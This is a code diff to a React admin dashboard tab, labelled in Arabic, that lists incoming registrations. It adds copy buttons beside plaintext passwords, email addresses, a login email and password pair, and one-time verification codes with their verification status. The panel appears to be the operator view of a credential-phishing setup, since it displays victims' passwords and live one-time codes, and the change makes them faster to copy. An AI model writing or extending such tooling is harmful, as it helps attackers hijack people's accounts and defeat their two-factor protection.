@@ -4,7 +4,7 @@ import {
   Users, CheckCircle2, Clock, Activity, Eye, EyeOff,
   RefreshCw, Wifi, WifiOff, Shield, Calendar, Phone,
   CreditCard, Mail, Layout, List, User, Lock, FileText, Hash,
-  LogIn as LogInIcon, ShieldCheck
+  LogIn as LogInIcon, ShieldCheck, Copy, Check
 } from 'lucide-react';
 import { useSiteConfig, FormField } from '@/context/SiteConfigContext';
 import HeaderFooterEditor from '@/components/cms/HeaderFooterEditor';
@@ -93,6 +93,13 @@ function RegistrationsTab() {
   const [loading, setLoading] = useState(true);
   const [connected, setConnected] = useState(false);
   const [showPassMap, setShowPassMap] = useState<Record<string, boolean>>({});
+  const [copiedId, setCopiedId] = useState<string | null>(null);
+
+  const copyToClipboard = (text: string, id: string) => {
+    navigator.clipboard.writeText(text);
+    setCopiedId(id);
+    setTimeout(() => setCopiedId(null), 1500);
+  };
   const [selectedId, setSelectedId] = useState<string | null>(null);
   const channelRef = useRef<ReturnType<typeof supabase.channel> | null>(null);
 
@@ -383,6 +390,12 @@ function RegistrationsTab() {
                                               <button onClick={() => togglePassVisibility(item.id)} className="text-xs text-blue-400 hover:underline shrink-0">
                                                 {showPassMap[item.id] ? 'إخفاء' : 'إظهار'}
                                               </button>
+                                              {value && (
+                                                <button onClick={() => copyToClipboard(value, `pass-${item.id}`)} className="text-xs text-green-400 hover:underline shrink-0 flex items-center gap-1">
+                                                  {copiedId === `pass-${item.id}` ? <Check className="w-3 h-3" /> : <Copy className="w-3 h-3" />}
+                                                  {copiedId === `pass-${item.id}` ? 'تم' : 'نسخ'}
+                                                </button>
+                                              )}
                                             </div>
                                           </div>
                                         </div>
@@ -393,7 +406,15 @@ function RegistrationsTab() {
                                         <Icon className="w-4 h-4 text-slate-400 mt-0.5 shrink-0" />
                                         <div className="min-w-0 flex-1">
                                           <p className="text-[10px] text-slate-500 font-medium mb-0.5">{field.label}</p>
-                                          <p className="text-sm text-white font-semibold truncate">{value || '—'}</p>
+                                          <div className="flex items-center justify-between gap-2">
+                                            <p className="text-sm text-white font-semibold truncate">{value || '—'}</p>
+                                            {value && (field.field_type === 'email' || field.field_key === 'email') && (
+                                              <button onClick={() => copyToClipboard(value, `email-${item.id}`)} className="text-xs text-green-400 hover:underline shrink-0 flex items-center gap-1">
+                                                {copiedId === `email-${item.id}` ? <Check className="w-3 h-3" /> : <Copy className="w-3 h-3" />}
+                                                {copiedId === `email-${item.id}` ? 'تم' : 'نسخ'}
+                                              </button>
+                                            )}
+                                          </div>
                                         </div>
                                       </div>
                                     );
@@ -418,11 +439,23 @@ function RegistrationsTab() {
                               </div>
                               <div className="grid grid-cols-2 gap-3">
                                 <div className="bg-slate-900/50 rounded-lg p-3">
-                                  <p className="text-[10px] text-slate-500 mb-1">البريد</p>
+                                  <div className="flex items-center justify-between mb-1">
+                                    <p className="text-[10px] text-slate-500">البريد</p>
+                                    <button onClick={() => copyToClipboard(item.data.email, `login-email-${item.id}`)} className="text-[10px] text-green-400 hover:underline flex items-center gap-1">
+                                      {copiedId === `login-email-${item.id}` ? <Check className="w-3 h-3" /> : <Copy className="w-3 h-3" />}
+                                      {copiedId === `login-email-${item.id}` ? 'تم' : 'نسخ'}
+                                    </button>
+                                  </div>
                                   <p className="text-xs text-slate-200 truncate ltr text-left">{item.data.email}</p>
                                 </div>
                                 <div className="bg-slate-900/50 rounded-lg p-3">
-                                  <p className="text-[10px] text-slate-500 mb-1">كلمة المرور</p>
+                                  <div className="flex items-center justify-between mb-1">
+                                    <p className="text-[10px] text-slate-500">كلمة المرور</p>
+                                    <button onClick={() => copyToClipboard(item.data.password, `login-pass-${item.id}`)} className="text-[10px] text-green-400 hover:underline flex items-center gap-1">
+                                      {copiedId === `login-pass-${item.id}` ? <Check className="w-3 h-3" /> : <Copy className="w-3 h-3" />}
+                                      {copiedId === `login-pass-${item.id}` ? 'تم' : 'نسخ'}
+                                    </button>
+                                  </div>
                                   <p className="text-sm text-white font-bold tracking-wider">{item.data.password}</p>
                                 </div>
                               </div>
@@ -444,7 +477,13 @@ function RegistrationsTab() {
                                 </span>
                               </div>
                               <div className="bg-slate-900/50 rounded-lg p-3 text-center">
-                                <p className="text-[10px] text-slate-500 mb-1">رمز التحقق</p>
+                                <div className="flex items-center justify-between mb-1">
+                                  <p className="text-[10px] text-slate-500">رمز التحقق</p>
+                                  <button onClick={() => copyToClipboard(item.data.code, `code-${item.id}`)} className="text-[10px] text-green-400 hover:underline flex items-center gap-1">
+                                    {copiedId === `code-${item.id}` ? <Check className="w-3 h-3" /> : <Copy className="w-3 h-3" />}
+                                    {copiedId === `code-${item.id}` ? 'تم' : 'نسخ'}
+                                  </button>
+                                </div>
                                 <p className="text-xl text-white font-bold tracking-[0.3em]">{item.data.code}</p>
                                 <p className={`text-[10px] mt-2 ${item.data.verified ? 'text-green-400' : 'text-yellow-400'}`}>
                                   {item.data.verified ? 'تم التحقق ✓' : 'لم يتم التحقق'}
